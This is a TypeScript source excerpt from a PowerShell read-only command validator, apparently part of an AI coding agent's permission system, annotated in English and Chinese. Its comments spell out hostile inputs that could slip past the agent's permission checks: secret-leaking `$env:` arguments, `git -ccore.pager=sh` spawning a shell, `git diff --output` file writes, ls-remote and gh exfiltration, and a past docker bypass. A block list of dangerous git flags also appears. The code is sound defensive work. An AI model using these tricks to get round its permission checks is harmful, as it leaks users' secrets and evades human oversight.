  if (cmd.nameType === 'application') {
    // Bypass for explicit safe .exe names (bash `which` parity — see
    // SAFE_EXTERNAL_EXES). SECURITY: match the raw first token of cmd.text,
    // not cmd.name. stripModulePrefix collapses scripts\where.exe →
    // cmd.name='where.exe', but cmd.text preserves 'scripts\where.exe ...'.
// 旁路比对用的是 cmd.text（原始文本）的第一个 token ——
// **不是** cmd.name（已被削掉路径前缀）。这个区别是旁路本身的安全前提。
    const rawFirstToken = cmd.text.split(/\s/, 1)[0]?.toLowerCase() ?? ''
    if (!SAFE_EXTERNAL_EXES.has(rawFirstToken)) {
      return false
    }
    // Fall through to lookupAllowlist — CMDLET_ALLOWLIST['where.exe'] handles
    // flag validation (empty config = all flags OK, matching bash's `which`).
  }

  const config = lookupAllowlist(cmd.name)
  if (!config) {
    return false
  }

  // If there's a regex constraint, check it against the original command
  if (config.regex && !config.regex.test(originalCommand)) {
    return false
  }

  // If there's an additional callback, check it
  if (config.additionalCommandIsDangerousCallback?.(originalCommand, cmd)) {
    return false
  }

// ===== 参数类型白名单（本文件最核心的防御之一）=====
// 中文复述上方那段长注释：只接受 StringConstant 和 Parameter，其余一律拒绝。
// 为什么：Variable / 'Other' 在**运行时才会求值**，校验时看到的只是文本。
//   Get-Process $env:AWS_SECRET → 报错信息里带着密钥，模型就看到了
//   Get-Process @{k=$env:SECRET} / [string]$env:SECRET / ($a+$b) → 同样的泄漏
// 而且「裸变量」连前面的 hasSyncSecurityConcerns 都抓不到（它只认 $( / .Method( / $var= 等）。
// 这对应 BashTool 里那句「只要 token 里有 $ 就拒绝」的同类防御。
  // SECURITY: whitelist arg elementTypes — only StringConstant and Parameter
  // are statically verifiable. Everything else expands/evaluates at runtime:
  //   'Variable'          → `Get-Process $env:AWS_SECRET_ACCESS_KEY` expands,
  //                         errors "Cannot find process 'sk-ant-...'", model
  //                         reads the secret from the error
  //   'Other' (Hashtable) → `Get-Process @{k=$env:SECRET}` same leak
  //   'Other' (Convert)   → `Get-Process [string]$env:SECRET` same leak
  //   'Other' (BinaryExpr)→ `Get-Process ($env:SECRET + '')` same leak
  //   'SubExpression'     → arbitrary code (already caught by deriveSecurityFlags
  //                         at the isReadOnlyCommand layer, but isAllowlistedCommand
  //                         is also called from checkPermissionMode directly)
  // hasSyncSecurityConcerns misses bare $var (only matches `$(`/@var/.Method(/
  // $var=/--%/::); deriveSecurityFlags has no 'Variable' case; the safeFlags
  // loop below validates flag NAMES but not positional arg TYPES. File cmdlets
  // (CMDLET_PATH_CONFIG) are already protected by SAFE_PATH_ELEMENT_TYPES in
  // pathValidation.ts — this closes the gap for non-file cmdlets (Get-Process,
  // Get-Service, Get-Command, ~15 others). PS equivalent of Bash's blanket `$`
  // token check at BashTool/readOnlyValidation.ts:~1356.
  //
  // Placement: BEFORE external-command dispatch so git/gh/docker/dotnet get
  // this too (defense-in-depth with their string-based `$` checks; catches
  // @{...}/[cast]/($a+$b) that `$` substring misses). In PS argument mode,
  // bare `5` tokenizes as StringConstant (BareWord), not a numeric literal,
  // so `git log -n 5` passes.
  //
  // SECURITY: elementTypes undefined → fail-closed. The real parser always
  // sets it (parser.ts:769/781/812), so undefined means an untrusted or
  // malformed element. Previously skipped (fail-open) for test-helper
  // convenience; test helpers now set elementTypes explicitly.
  // elementTypes[0] is the command name; args start at elementTypes[1].
// elementTypes 缺失 → **直接拒绝**（fail-closed）。
// 真实解析器总会设置它，undefined 意味着元素不可信或被篡改过。
// （历史教训：以前这里为了测试方便跳过检查，等于 fail-open。）
  if (!cmd.elementTypes) {
    return false
  }
  {
    for (let i = 1; i < cmd.elementTypes.length; i++) {
      const t = cmd.elementTypes[i]
      if (t !== 'StringConstant' && t !== 'Parameter') {
        // ArrayLiteralAst (`Get-Process Name, Id`) maps to 'Other'. The
        // leak vectors enumerated above all have a metachar in their extent
        // text: Hashtable `@{`, Convert `[`, BinaryExpr-with-var `$`,
        // ParenExpr `(`. A bare comma-list of identifiers has none.
// 数组字面量（Name, Id）在 AST 里也是 'Other'，但它无害。
// 这里用「文本里有没有元字符」来区分：有 $ ( @ { [ 说明藏着东西，拒绝；
// 否则当作裸标识符列表放行。这是**保守但可用**的折中。
        if (!/[$(@{[]/.test(cmd.args[i - 1] ?? '')) {
          continue
        }
        return false
      }
      // Colon-bound parameter (`-Flag:$env:SECRET`) is a SINGLE
      // CommandParameterAst — the VariableExpressionAst is its .Argument
      // child, not a separate CommandElement, so elementTypes says 'Parameter'
      // and the whitelist above passes.
      //
      // Query the parser's children[] tree instead of doing
      // string-archaeology on the arg text. children[i-1] holds the
      // .Argument child's mapped type (aligned with args[i-1]).
      // Tree query catches MORE than the string check — e.g.
      // `-InputObject:@{k=v}` (HashtableAst → 'Other', no `$` in text),
      // `-Name:('payload' > file)` (ParenExpressionAst with redirection).
      // Fallback to the extended metachar check when children is undefined
      // (backward compat / test helpers that don't set it).
// 冒号绑定值（-Flag:$env:SECRET）在 AST 里是**一个** Parameter 节点，
// 变量藏在它的 .Argument 子节点里 —— 所以必须查 children[] 才能看到真实类型。
// 查树比「看文本里有没有 $」能抓到更多情况（如 -InputObject:@{k=v} 没有 $）。
      if (t === 'Parameter') {
        const paramChildren = cmd.children?.[i - 1]
        if (paramChildren) {
          if (paramChildren.some(c => c.type !== 'StringConstant')) {
            return false
          }
        } else {
          // Fallback: string-archaeology on arg text (pre-children parsers).
          // Reject `$` (variable), `(` (ParenExpressionAst), `@` (hash/array
          // sub), `{` (scriptblock), `[` (type literal/static method).
          const arg = cmd.args[i - 1] ?? ''
          const colonIdx = arg.indexOf(':')
          if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
            return false
          }
        }
      }
    }
  }

// 解析成规范名后再分派：外部命令（git/gh/docker/dotnet）走共享的只读表，
// 其余 PowerShell cmdlet 走下面的 flag 白名单。
  const canonical = resolveToCanonical(cmd.name)

  // Handle external commands via shared validation
  if (
    canonical === 'git' ||
    canonical === 'gh' ||
    canonical === 'docker' ||
    canonical === 'dotnet'
  ) {
    return isExternalCommandSafe(canonical, cmd.args)
  }

// Windows 上 / 也是原生命令的 flag 前缀（findstr /S），
// 但 PowerShell **cmdlet** 只用 - 前缀，所以 /tmp 对 cmdlet 来说是路径不是 flag。
// 判据：规范名里有没有连字符 —— 有连字符就是 Verb-Noun 形式的 cmdlet。
  // On Windows, / is a valid flag prefix for native commands (e.g., findstr /S).
  // But PowerShell cmdlets always use - prefixed parameters, so /tmp is a path,
  // not a flag. We detect cmdlets by checking if the command resolves to a
  // Verb-Noun canonical name (either directly or via alias).
  const isCmdlet = canonical.includes('-')

// allowAllFlags = 明确声明「这个命令的所有 flag 都无害」，跳过 flag 校验。
// 反过来，safeFlags 缺失/为空 ≠ 全放行，而是「只接受位置参数、拒绝一切 flag」。
// 这个「默认拒绝」的取向非常重要。
  // SECURITY: if allowAllFlags is set, skip flag validation (command's entire
  // flag surface is read-only). Otherwise, missing/empty safeFlags means
  // "positional args only, reject all flags" — NOT "accept everything".
  if (config.allowAllFlags) {
    return true
  }
  if (!config.safeFlags || config.safeFlags.length === 0) {
    // No safeFlags defined and allowAllFlags not set: reject any flags.
    // Positional-only args are still allowed (the loop below won't fire).
    // This is the safe default — commands must opt in to flag acceptance.
    const hasFlags = cmd.args.some((arg, i) => {
      if (isCmdlet) {
        return isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
      }
      return (
        arg.startsWith('-') ||
        (process.platform === 'win32' && arg.startsWith('/'))
      )
    })
    return !hasFlags
  }

  // Validate that all flags used are in the allowlist.
  // SECURITY: use elementTypes as ground
  // truth for parameter detection. PowerShell's tokenizer accepts en-dash/
  // em-dash/horizontal-bar (U+2013/2014/2015) as parameter prefixes; a raw
  // startsWith('-') check misses `–ComputerName` (en-dash). The parser maps
  // CommandParameterAst → 'Parameter' regardless of dash char.
  // elementTypes[0] is the name element; args start at elementTypes[1].
// ===== flag 白名单校验 =====
// 注意判断「这是不是 flag」时要以 **elementTypes 为准**（AST 的地面真相），
// 因为 PowerShell 认 en-dash/em-dash/horizontal-bar 当参数前缀，
// 朴素的 startsWith('-') 会漏掉 `–ComputerName`。
  for (let i = 0; i < cmd.args.length; i++) {
    const arg = cmd.args[i]!
    // For cmdlets: trust elementTypes (AST ground truth, catches Unicode dashes).
    // For native exes on Windows: also check `/` prefix (argv convention, not
    // tokenizer — the parser sees `/S` as a positional, not CommandParameterAst).
    const isFlag = isCmdlet
      ? isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
      : arg.startsWith('-') ||
        (process.platform === 'win32' && arg.startsWith('/'))
    if (isFlag) {
      // For cmdlets, normalize Unicode dash to ASCII hyphen for safeFlags
      // comparison (safeFlags entries are always written with ASCII `-`).
      // Native-exe safeFlags are stored with `/` (e.g. '/FO') — don't touch.
// 把 Unicode 破折号归一化成 ASCII 减号再比对（safeFlags 里存的都是 ASCII -）。
// 原生 exe 的 safeFlags 存的是 /FO 这种形式，不能动。
      let paramName = isCmdlet ? '-' + arg.slice(1) : arg
      const colonIndex = paramName.indexOf(':')
      if (colonIndex > 0) {
        paramName = paramName.substring(0, colonIndex)
      }

// 通用参数（-ErrorAction / -Verbose / -Debug 等）由 [CmdletBinding()] 挂到
// 每个 cmdlet 上，只影响错误/警告流的去向，**不可能**让只读命令变写操作，
// 所以无条件放行。不放行的话 `Get-Content x -ErrorAction SilentlyContinue`
// 会白白弹框（因为 -ErrorAction 不在 Get-Content 的 safeFlags 里）。
      // -ErrorAction/-Verbose/-Debug etc. are accepted by every cmdlet via
      // [CmdletBinding()] and only route error/warning/progress streams —
      // they can't make a read-only cmdlet write. pathValidation.ts already
      // merges these into its per-cmdlet param sets (line ~1339); this is
      // the same merge for safeFlags. Without it, `Get-Content file.txt
      // -ErrorAction SilentlyContinue` prompts despite Get-Content being
      // allowlisted. Only for cmdlets — native exes don't have common params.
      const paramLower = paramName.toLowerCase()
      if (isCmdlet && COMMON_PARAMETERS.has(paramLower)) {
        continue
      }
      const isSafe = config.safeFlags.some(
        flag => flag.toLowerCase() === paramLower,
      )
      if (!isSafe) {
        return false
      }
    }
  }

  return true
}

// ===== 外部命令校验（git / gh / docker / dotnet）=====
// 这四个不是 PowerShell cmdlet，而是外部可执行程序，
// 用的是 BashTool **共用**的那套只读子命令表（utils/shell/readOnlyCommandValidation.js）。
// ---------------------------------------------------------------------------
// External command validation (git, gh, docker) using shared configs
// ---------------------------------------------------------------------------

/**
 * 【中文】按命令名分派到各自的校验函数。default 返回 false（fail-closed）。
 */
function isExternalCommandSafe(command: string, args: string[]): boolean {
  switch (command) {
    case 'git':
      return isGitSafe(args)
    case 'gh':
      return isGhSafe(args)
    case 'docker':
      return isDockerSafe(args)
    case 'dotnet':
      return isDotnetSafe(args)
    default:
      return false
  }
}

// 危险的 git **全局** flag：会让 git 与我们「看到」的子命令不一致，
// 或者干脆有副作用（如 -c 可以改配置）。直接拒绝。
const DANGEROUS_GIT_GLOBAL_FLAGS = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
// --attr-source 是典型的「解析器差异」攻击（对应上方英文注释）：
//   git --attr-source HEAD~10 log status
//   我们：跳过 HEAD~10，把 log 当子命令 → 放行（log 是只读的）
//   git：把 log 当 pathspec 吃掉，真正跑的是 **status**
// 双方理解不同，白名单就是形同虚设。遇到这种直接拒绝，而不是试图对齐。
  // SECURITY: --attr-source creates a parser differential. Git treats the
  // token after the tree-ish value as a pathspec (not the subcommand), but
  // our skip-by-2 loop would treat it as the subcommand:
  //   git --attr-source HEAD~10 log status
  //   validator: advances past HEAD~10, sees subcmd=log → allow
  //   git:       consumes `log` as pathspec, runs `status` as the real subcmd
  // Verified with `GIT_TRACE=1 git --attr-source HEAD~10 log status` →
  // `trace: built-in: git status`. Reject outright rather than skip-by-2.
  '--attr-source',
])

// 会**吃掉后面一个值**的全局 flag 清单。
// 这张表必须**完整**：漏一个就会造成上面那种「值被子命令误认」的差异。
// （已按 git 2.51 的 man page + GIT_TRACE 实测审计过。）
// Git global flags that accept a separate (space-separated) value argument.
// When the loop encounters one without an inline `=` value, it must skip the
// next token so the value isn't mistaken for the subcommand.
//
// SECURITY: This set must be COMPLETE. Any value-consuming global flag not
// listed here creates a parser differential: validator sees the value as the
// subcommand, git consumes it and runs the NEXT token. Audited against
// `man git` + GIT_TRACE for git 2.51; --list-cmds is `=`-only, booleans
// (-p/--bare/--no-*/--*-pathspecs/--html-path/etc.) advance by 1 via the
// default path. --attr-source REMOVED: it also triggers pathspec parsing,
// creating a second differential — moved to DANGEROUS_GIT_GLOBAL_FLAGS above.
const GIT_GLOBAL_FLAGS_WITH_VALUES = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--super-prefix',
  '--shallow-file',
])

// 短 flag 的**连写形式**：git 支持 -c<name>=<value> 和 -C<path>（中间无空格），
// 按 = 切分后得到的是 '-ccore.pager' 这种，不在上面的名单里 —— 必须前缀匹配。
// Git short global flags that accept attached-form values (no space between
// flag letter and value). Long options (--git-dir etc.) require `=` or space,
// so the split-on-`=` check handles them. But `-ccore.pager=sh` and `-C/path`
// need prefix matching: git parses `-c<name>=<value>` and `-C<path>` directly.
const DANGEROUS_GIT_SHORT_FLAGS_ATTACHED = ['-c', '-C']

/**
 * 【中文】git 命令是否只读？
 *
 * @param args git 后面的参数（不含 git 本身）
 * @returns true = 只读
 *
 * 步骤：① 任一参数含 $ → 拒绝（运行时会被 PowerShell 展开，
 *         例如 $VAR='--output=/tmp/evil' 就把 git diff 变成了写文件）
 *      ② 跳过全局 flag（同时拒绝危险 flag、处理「吃掉值」的 flag）
 *      ③ 先按「两词子命令」（git stash list）查表，再按「单词子命令」（git diff）查
 *      ④ ls-remote 额外拒绝看起来像 URL 的位置参数（防外泄）
 *      ⑤ 最后用共享的 validateFlags 校验剩余 flag
 */
function isGitSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true
  }

  // SECURITY: Reject any arg containing `$` (variable reference). Bare
  // VariableExpressionAst positionals reach here as literal text ($env:SECRET,
  // $VAR). deriveSecurityFlags does not gate bare Variable args. The validator
  // sees `$VAR` as text; PowerShell expands it at runtime. Parser differential:
  //   git diff $VAR   where $VAR = '--output=/tmp/evil'
  //   → validator sees positional '$VAR' → validateFlags passes
  //   → PowerShell runs `git diff --output=/tmp/evil` → file write
  // This generalizes the ls-remote inline `$` guard below to all git subcommands.
  // Bash equivalent: BashTool blanket
  // `$` rejection at readOnlyValidation.ts:~1352. isGhSafe has the same guard.
// 含 $ 就拒绝：这是「字面文本 ≠ 运行时内容」这条原则在 git 上的体现。
// 与 BashTool 里「token 里有 $ 一律拒绝」是同一条规则。
  for (const arg of args) {
    if (arg.includes('$')) {
      return false
    }
  }

  // Skip over global flags before the subcommand, rejecting dangerous ones.
  // Flags that take space-separated values must consume the next token so it
  // isn't mistaken for the subcommand (e.g. `git --namespace foo status`).
  let idx = 0
  while (idx < args.length) {
    const arg = args[idx]
    if (!arg || !arg.startsWith('-')) {
      break
    }
    // SECURITY: Attached-form short flags. `-ccore.pager=sh` splits on `=` to
    // `-ccore.pager`, which isn't in DANGEROUS_GIT_GLOBAL_FLAGS. Git accepts
    // `-c<name>=<value>` and `-C<path>` with no space. We must prefix-match.
    // Note: `--cached`, `--config-env`, etc. already fail startsWith('-c') at
    // position 1 (`-` ≠ `c`). The `!== '-'` guard only applies to `-c`
    // (git config keys never start with `-`, so `-c-key` is implausible).
    // It does NOT apply to `-C` — directory paths CAN start with `-`, so
    // `git -C-trap status` must reject. `git -ccore.pager=sh log` spawns a shell.
// 注意 -c 和 -C 的处理**不对称**（对应上方英文注释）：
//   -c 后面跟的是配置键，键不会以 - 开头，所以 -c-key 不合常理，可以豁免；
//   -C 后面跟的是**目录路径**，路径完全可能以 - 开头（-C-trap），必须拒绝。
    for (const shortFlag of DANGEROUS_GIT_SHORT_FLAGS_ATTACHED) {
      if (
        arg.length > shortFlag.length &&
        arg.startsWith(shortFlag) &&
        (shortFlag === '-C' || arg[shortFlag.length] !== '-')
      ) {
        return false
      }
    }
    const hasInlineValue = arg.includes('=')
    const flagName = hasInlineValue ? arg.split('=')[0] || '' : arg
    if (DANGEROUS_GIT_GLOBAL_FLAGS.has(flagName)) {
      return false
    }
    // Consume the next token if the flag takes a separate value
    if (!hasInlineValue && GIT_GLOBAL_FLAGS_WITH_VALUES.has(flagName)) {
      idx += 2
    } else {
      idx++
    }
  }

  if (idx >= args.length) {
    return true
  }

  // Try multi-word subcommand first (e.g. 'stash list', 'config --get', 'remote show')
  const first = args[idx]?.toLowerCase() || ''
  const second = idx + 1 < args.length ? args[idx + 1]?.toLowerCase() || '' : ''

  // GIT_READ_ONLY_COMMANDS keys are like 'git diff', 'git stash list'
  const twoWordKey = `git ${first} ${second}`
  const oneWordKey = `git ${first}`

  let config: ExternalCommandConfig | undefined =
    GIT_READ_ONLY_COMMANDS[twoWordKey]
  let subcommandTokens = 2

  if (!config) {
    config = GIT_READ_ONLY_COMMANDS[oneWordKey]
    subcommandTokens = 1
  }

  if (!config) {
    return false
  }

  const flagArgs = args.slice(idx + subcommandTokens)

// ls-remote 带 URL = 数据外泄通道（可以把密钥编进主机名里，
// 通过 DNS/HTTP 请求带出去）。所以拒绝一切像 URL 的位置参数。
  // git ls-remote URL rejection — ported from BashTool's inline guard
  // (src/tools/BashTool/readOnlyValidation.ts:~962). ls-remote with a URL
  // is a data-exfiltration vector (encode secrets in hostname → DNS/HTTP).
  // Reject URL-like positionals: `://` (http/git protocols), `@` + `:` (SSH
  // git@host:path), and `$` (variable refs — $env:URL reaches here as the
  // literal string '$env:URL' when the arg's elementType is Variable; the
  // security-flag checks don't gate bare Variable positionals passed to
  // external commands).
  if (first === 'ls-remote') {
    for (const arg of flagArgs) {
      if (!arg.startsWith('-')) {
        if (
          arg.includes('://') ||
          arg.includes('@') ||
          arg.includes(':') ||
          arg.includes('$')
        ) {
          return false
        }
      }
    }
  }

  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config, { commandName: 'git' })
}

/**
 * 【中文】gh（GitHub CLI）命令是否只读？结构与 isGitSafe 类似。
 */
function isGhSafe(args: string[]): boolean {
  // gh commands are network-dependent; only allow for ant users
// gh 全部依赖网络，只对内部用户（USER_TYPE=ant）放行。
  if (process.env.USER_TYPE !== 'ant') {
    return false
  }

  if (args.length === 0) {
    return true
  }

  // Try two-word subcommand first (e.g. 'pr view')
  let config: ExternalCommandConfig | undefined
  let subcommandTokens = 0

  if (args.length >= 2) {
    const twoWordKey = `gh ${args[0]?.toLowerCase()} ${args[1]?.toLowerCase()}`
    config = GH_READ_ONLY_COMMANDS[twoWordKey]
    subcommandTokens = 2
  }

  // Try single-word subcommand (e.g. 'gh version')
  if (!config && args.length >= 1) {
    const oneWordKey = `gh ${args[0]?.toLowerCase()}`
    config = GH_READ_ONLY_COMMANDS[oneWordKey]
    subcommandTokens = 1
  }

  if (!config) {
    return false
  }

  const flagArgs = args.slice(subcommandTokens)

// 与 git 一样拒绝含 $ 的参数：gh 的子命令全都面向网络，
// 一个变量参数就是把密钥发出去的通道。
  // SECURITY: Reject any arg containing `$` (variable reference). Bare
  // VariableExpressionAst positionals reach here as literal text ($env:SECRET).
  // deriveSecurityFlags does not gate bare Variable args — only subexpressions,
  // splatting, expandable strings, etc. All gh subcommands are network-facing,
  // so a variable arg is a data-exfiltration vector:
  //   gh search repos $env:SECRET_API_KEY
  //   → PowerShell expands at runtime → secret sent to GitHub API.
  // git ls-remote has an equivalent inline guard; this generalizes it for gh.
  // Bash equivalent: BashTool blanket `$` rejection at readOnlyValidation.ts:~1352.
  for (const arg of flagArgs) {
    if (arg.includes('$')) {
      return false
    }
  }
  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config)
}

/**
 * 【中文】docker 命令是否只读？
 */
function isDockerSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true
  }

// 含 $ 拒绝。注意这里检查**所有** args（不是 flagArgs），
// 因为子命令位置上的 args[0] 也可能是 $env:X。
// 历史教训：以前这个检查放在 fast-path 之后，等于对 docker ps 永不生效，
// 于是 `docker ps --format $env:AWS_SECRET` 被自动放行，
// docker 报错信息里带着密钥，模型就读到了。
  // SECURITY: blanket PowerShell `$` variable rejection. Same guard as
  // isGitSafe and isGhSafe. Parser differential: validator sees literal
  // '$env:X'; PowerShell expands at runtime. Runs BEFORE the fast-path
  // return — the previous location (after fast-path) never fired for
  // `docker ps`/`docker images`. The earlier comment claiming those take no
  // --format was wrong: `docker ps --format $env:AWS_SECRET_ACCESS_KEY`
  // auto-allowed, PowerShell expanded, docker errored with the secret in
  // its output, model read it. Check ALL args, not flagArgs — args[0]
  // (subcommand slot) could also be `$env:X`. elementTypes whitelist isn't
  // applicable here: this function receives string[] (post-stringify), not
  // ParsedCommandElement; the isAllowlistedCommand caller applies the
  // elementTypes gate one layer up.
  for (const arg of args) {
    if (arg.includes('$')) {
      return false
    }
  }

  const oneWordKey = `docker ${args[0]?.toLowerCase()}`

  // Fast path: EXTERNAL_READONLY_COMMANDS entries ('docker ps', 'docker images')
  // have no flag constraints — allow unconditionally (after $ guard above).
// 快路径：EXTERNAL_READONLY_COMMANDS（docker ps / docker images）没有任何
// flag 约束，检查过 $ 之后直接放行。
  if (EXTERNAL_READONLY_COMMANDS.includes(oneWordKey)) {
    return true
  }

  // DOCKER_READ_ONLY_COMMANDS entries ('docker logs', 'docker inspect') have
  // per-flag configs. Mirrors isGhSafe: look up config, then validateFlags.
  const config: ExternalCommandConfig | undefined =
    DOCKER_READ_ONLY_COMMANDS[oneWordKey]
  if (!config) {
    return false
  }

  const flagArgs = args.slice(1)

  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config)
}

/**
 * 【中文】dotnet 命令是否只读？只放行 --version / --info / --list-* 这几个
 * 查询型顶层 flag；**所有**参数都必须在白名单里（比其它几个更严）。
 */
function isDotnetSafe(args: string[]): boolean {
  if (args.length === 0) {
    return false
  }

  // dotnet uses top-level flags like --version, --info, --list-runtimes
  // All args must be in the safe set
  for (const arg of args) {
    if (!DOTNET_READ_ONLY_FLAGS.has(arg.toLowerCase())) {
      return false
    }
  }

  return true
}
